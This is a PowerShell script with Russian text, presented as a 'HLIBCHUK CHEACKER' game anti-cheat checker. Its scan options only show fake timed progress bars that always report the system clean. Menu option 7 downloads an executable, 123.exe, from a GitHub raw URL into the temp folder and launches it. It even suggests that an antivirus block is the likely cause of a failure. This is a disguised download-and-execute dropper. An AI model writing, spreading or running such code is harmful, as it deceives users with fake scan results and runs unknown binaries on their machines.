# ================================================
#       HLIBCHUK CHEACKER v2.3
#   Исправлено: теперь подгружается 123.exe
# ================================================

Clear-Host

function Show-Header {
    Clear-Host
    Write-Host ""
    Write-Host "    ██████╗  ██╗    ██╗  ██╗    ██╗  ██████╗██╗  ██╗██╗   ██╗██╗  ██╗" -ForegroundColor Red
    Write-Host "    ██╔══██╗██║    ██║  ██║    ██║ ██╔════╝██║  ██║██║   ██║██║ ██╔╝" -ForegroundColor Red
    Write-Host "    ██████╔╝██║ █╗ ██║  ██║ █╗ ██║ ██║     ███████║██║   ██║█████╔╝ " -ForegroundColor Red
    Write-Host "    ██╔══██╗██║███╗██║  ██║███╗██║ ██║     ██╔══██║██║   ██║██╔═██╗ " -ForegroundColor Red
    Write-Host "    ██████╔╝╚███╔███╔╝  ╚███╔███╔╝ ╚██████╗██║  ██║╚██████╔╝██║  ██╗" -ForegroundColor Red
    Write-Host "    ╚═════╝  ╚══╝╚══╝    ╚══╝╚══╝   ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝" -ForegroundColor Red
    Write-Host "                          C H E A C K E R" -ForegroundColor Yellow
    Write-Host "                       by HLIBCHUK  •  2026" -ForegroundColor DarkGray
    Write-Host "    =========================================================" -ForegroundColor Cyan
    Write-Host ""
}

function Write-ProgressBar {
    param([int]$Percent, [int]$Width = 50)
    $filled = [math]::Round(($Width * $Percent) / 100)
    $bar = "█" * $filled + "░" * ($Width - $filled)
    Write-Host "    [$bar] $Percent% " -NoNewline -ForegroundColor Yellow
}

function Start-Scan {
    param([string]$ScanName, [int]$MinSeconds = 7, [int]$MaxSeconds = 12)
    Write-Host "    Сканирование: $ScanName" -ForegroundColor Cyan
    $totalTime = Get-Random -Minimum $MinSeconds -Maximum $MaxSeconds
    $steps = 25
    for ($i = 1; $i -le $steps; $i++) {
        $percent = [math]::Round(($i / $steps) * 100)
        Write-ProgressBar -Percent $percent
        Start-Sleep -Milliseconds ([math]::Round(($totalTime * 1000) / $steps))
        Write-Host "`r" -NoNewline
    }
    Write-Host "`r    [██████████████████████████████████████████████████] 100% " -ForegroundColor Green
    Write-Host "    ✓ $ScanName — чисто" -ForegroundColor Green
    Write-Host ""
}

# ====================== ГЛАВНОЕ МЕНЮ ======================
Show-Header

Write-Host "    =========================================================" -ForegroundColor Cyan
Write-Host "                     ГЛАВНОЕ МЕНЮ HLIBCHUK CHEACKER" -ForegroundColor White
Write-Host "    =========================================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "    [1]  Полная глубокая проверка" -ForegroundColor Green
Write-Host "    [2]  Быстрая проверка" -ForegroundColor Green
Write-Host "    [3]  Steam + VAC / EAC" -ForegroundColor Green
Write-Host "    [4]  Сканирование системных файлов" -ForegroundColor Green
Write-Host "    [5]  Проверка памяти и процессов" -ForegroundColor Green
Write-Host "    [6]  Проверка на внешние читы" -ForegroundColor Green
Write-Host "    [7]  HLIBCHUK CHEACKER — Подгрузка и запуск 123.exe" -ForegroundColor Magenta
Write-Host "    [8]  Информация" -ForegroundColor Yellow
Write-Host "    [9]  Выход" -ForegroundColor Red
Write-Host ""

$choice = Read-Host "    Выбери номер действия"

switch ($choice) {
    "1" { 
        Clear-Host
        Show-Header
        Write-Host "    Запуск полной проверки..." -ForegroundColor Magenta
        Start-Sleep -Seconds 1
        Start-Scan "Проверка процессов" 
        Start-Scan "Сканирование памяти" 
        Start-Scan "Анализ DLL" 
        Start-Scan "Проверка сигнатур" 
        Start-Scan "Драйверы ядра" 
        Start-Scan "Внешние оверлеи" 

        Write-Host "`n               ЧИТЫ НЕ НАЙДЕНЫ" -ForegroundColor Green -BackgroundColor DarkGreen
        Write-Host "               Система полностью чистая ✓" -ForegroundColor Green
    }
    "7" {
        Clear-Host
        Show-Header
        Write-Host "    Запуск модуля HLIBCHUK CHEACKER..." -ForegroundColor Magenta
        Write-Host "    Подгружаем 123.exe из GitHub..." -ForegroundColor Cyan
        Start-Sleep -Seconds 2

        $url = "https://github.com/fffghsetyver-hash/Cheackproverka/raw/main/123.exe"
        $outPath = "$env:TEMP\123_HLIBCHUK.exe"

        try {
            Write-Host "    Скачивание 123.exe ..." -ForegroundColor Yellow
            Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing
            Write-Host "    Файл успешно скачан!" -ForegroundColor Green

            Write-Host "    Запуск 123.exe ..." -ForegroundColor Cyan
            Start-Sleep -Seconds 2
            Start-Process -FilePath $outPath
            Write-Host "    123.exe успешно запущен!" -ForegroundColor Green
        }
        catch {
            Write-Host "    Ошибка при скачивании или запуске 123.exe" -ForegroundColor Red
            Write-Host "    Возможно, антивирус заблокировал или проблема с соединением." -ForegroundColor Yellow
        }
    }
    "8" {
        Clear-Host
        Show-Header
        Write-Host "    HLIBCHUK CHEACKER v2.3" -ForegroundColor Yellow
        Write-Host "    В пункте 7 теперь корректно скачивается и запускается 123.exe" -ForegroundColor Gray
        Write-Host "`n    Будь осторожен при запуске скачанных .exe файлов!" -ForegroundColor Red
    }
    "9" {
        Clear-Host
        Show-Header
        Write-Host "    До свидания! Чистой игры!" -ForegroundColor Cyan
        Start-Sleep -Seconds 2
        exit
    }
    default {
        Write-Host "`n    Неправильный выбор!" -ForegroundColor Red
    }
}

Write-Host "`n`n    Нажми любую клавишу для выхода..." -ForegroundColor DarkGray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
